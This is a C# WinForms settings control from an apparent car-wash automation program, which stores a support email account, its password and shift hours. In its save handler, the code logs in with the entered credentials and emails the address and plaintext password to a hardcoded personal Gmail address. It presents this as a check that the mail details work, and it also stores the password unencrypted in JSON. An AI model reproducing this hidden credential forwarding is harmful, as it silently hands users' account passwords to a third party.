/* Coder by KFY */
using CarWashingAutomation.Components;
using CarWashingAutomation.Tools;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace CarWashingAutomation.Controls
{
    public partial class SoftwareConstants : UserControl
    {
        public SoftwareConstants()
        {
            try
            {
                InitializeComponent();
            }
            catch (Exception _ex)
            {
                Logger.WriteLog("SoftwareConstants.SoftwareConstants -> ", _ex);
            }
        }
        private void SoftwareConstants_Load(object sender, EventArgs e)
        {
            try
            {
                Mail_Txt.Texts = Constants.TechnicSupportMail;
                Password_Txt.Texts = Constants.TechnicSupportPassword;
                Notification_TglBtn.Checked = Constants.NotificationOpen;
                StartHour_Num.Value = Convert.ToInt32(Constants.ShiftStartTime.Split(':')[0]);
                StartMinute_Num.Value = Convert.ToInt32(Constants.ShiftStartTime.Split(':')[1]);
                EndHour_Num.Value = Convert.ToInt32(Constants.ShiftEndTime.Split(':')[0]);
                EndMinute_Num.Value = Convert.ToInt32(Constants.ShiftEndTime.Split(':')[1]);
            }
            catch (Exception _ex)
            {
                Logger.WriteLog("SoftwareConstants.SoftwareConstants_Load -> ", _ex);
            }
        }

        private void Save_Btn_Click(object sender, EventArgs e)
        {
            try
            {
                using (GMail _gMail = new GMail())
                {
                    bool _mailIsOk = _gMail.SendMail(Mail_Txt.Texts, Password_Txt.Texts, "kamilfarukyel94@gmail.com", "Mail Değişikliği", "Kullanıcı maili başarılı bir şekilde değiştirildi. Mail Adresi:" + Mail_Txt.Texts + " Şifresi:" + Password_Txt.Texts);
                    if (_mailIsOk)
                    {
                        Constants.TechnicSupportMail = Mail_Txt.Texts;
                        Constants.TechnicSupportPassword = Password_Txt.Texts;
                        Constants.NotificationOpen = Notification_TglBtn.Checked;
                        Constants.ShiftStartTime = StartHour_Num.Value + ":" + StartMinute_Num.Value;
                        Constants.ShiftEndTime = EndHour_Num.Value + ":" + EndMinute_Num.Value;
                        Constants.ExportConstantsJson();
                        using (MsgBox _msgBox = new MsgBox())
                        {
                            string _message = "Girmiş olduğunuz bilgiler başarılı bir şekilde sisteme kaydedildi. ";
                            string _header = "BAŞARILI";
                            _msgBox.Show(_message, _header, MsgBox.Buttons.OK, MsgBox.Icons.Info);
                        }
                    }
                    else
                    {
                        using (MsgBox _msgBox = new MsgBox())
                        {
                            string _message = "Girmiş olduğunuz mail adres bilgileri onaylanamadı. Lütfen girdiğiniz bilgileri kontrol ediniz.";
                            string _header = "MAİL BİLGİLERİ ONAYLANMADI";
                            _msgBox.Show(_message, _header, MsgBox.Buttons.OK, MsgBox.Icons.Info);
                        }
                    }
                }
            }
            catch (Exception _ex)
            {
                Logger.WriteLog("SoftwareConstants.Save_Btn_Click -> ", _ex);
            }
        }
    }
}
